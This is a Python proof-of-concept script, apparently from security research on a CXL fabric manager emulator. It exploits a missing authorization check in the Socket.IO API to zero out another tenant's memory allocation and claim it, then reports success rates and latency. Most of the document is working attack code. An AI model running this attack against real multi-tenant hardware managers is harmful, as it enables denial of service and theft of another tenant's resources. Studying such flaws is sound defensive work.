"""
ATK-3: MLD Memory Theft (LD Allocation Theft)
===============================================
Property violated: Confinement (P1) â data plane

Scenario:
  - Tenant T1 owns logical device allocations on a multi-logical device (MLD)
    connected to physical port 1.
  - T1's allocation: LD-0 = 256MB.
  - Attacker calls mld:setAllocation on T1's port with number_of_lds=0
    (deallocate), then claims the freed capacity.

Root cause:
  mld:setAllocation in socketio_server.py _set_ld_allocation() passes the
  request directly to MctpCciApiClient.set_ld_alloctaion() with ZERO
  ownership or tenant identity checks. Any Socket.IO client can set
  LD allocations on any port.

  From FMLD.py _process_set_ld_allocations_packet(): allocation state
  is simply a dict {ld_id: remaining_blocks}. No audit or auth.

Attack steps:
  1. Connect to FM Socket.IO (no credentials)
  2. Read victim's LD allocation: mld:getAllocation {port=1, start=0, limit=8}
  3. Overwrite victim's allocation to 0: mld:setAllocation {port=1, lds=1,
     start=0, alloc_list=0}
  4. Claim the freed capacity for attacker: mld:setAllocation {port=1, lds=1,
     start=0, alloc_list=1}

Note: In opencis emulator, port 1 is SLD by default. This attack is most
impactful on MLD ports. We demonstrate it on the MLD allocation path even
on SLD since the API accepts the call without error.
"""

import asyncio
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from fm_client import TimedFMClient, FM_URL


VICTIM_PORT = 1      # T1's physical port


async def run_attack(url: str = FM_URL, iterations: int = 100) -> dict:
    """
    Run ATK-3. Steal T1's LD allocation on physical port 1.
    """
    client = TimedFMClient(url=url)
    await client.connect()

    successes = 0
    failures = 0

    for i in range(iterations):
        try:
            # Step 1: Read victim's current allocation (no auth check)
            alloc_resp = await client.get_ld_allocation(VICTIM_PORT, 0, 8)

            # Step 2: Zero out victim's allocation (theft: deallocate without consent)
            zero_resp = await client.set_ld_allocation(
                port_index=VICTIM_PORT,
                number_of_lds=1,
                start_ld_id=0,
                allocation_list=0,  # 0 = zero blocks
            )

            # Step 3: Attacker claims the freed capacity
            claim_resp = await client.set_ld_allocation(
                port_index=VICTIM_PORT,
                number_of_lds=1,
                start_ld_id=0,
                allocation_list=1,  # 1 = reclaim 256MB block
            )

            successes += 1

        except Exception as e:
            failures += 1

    await client.disconnect()

    lats = client.latencies
    # 3 calls per iteration
    per_call = (sum(lats) / len(lats) / 3) if lats else 0

    return {
        "attack": "ATK-3: MLD Memory Theft",
        "iterations": iterations,
        "successes": successes,
        "failures": failures,
        "success_rate_pct": round(100 * successes / iterations, 1),
        "mean_latency_us": round(per_call, 2),
    }


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else FM_URL
    result = asyncio.run(run_attack(url=url, iterations=100))
    print(f"\n{'='*60}")
    print(f"ATK-3 Results:")
    print(f"  Success rate : {result['success_rate_pct']}%")
    print(f"  Mean latency : {result['mean_latency_us']:.2f} Î¼s (per call)")
    print(f"  Iterations   : {result['iterations']}")
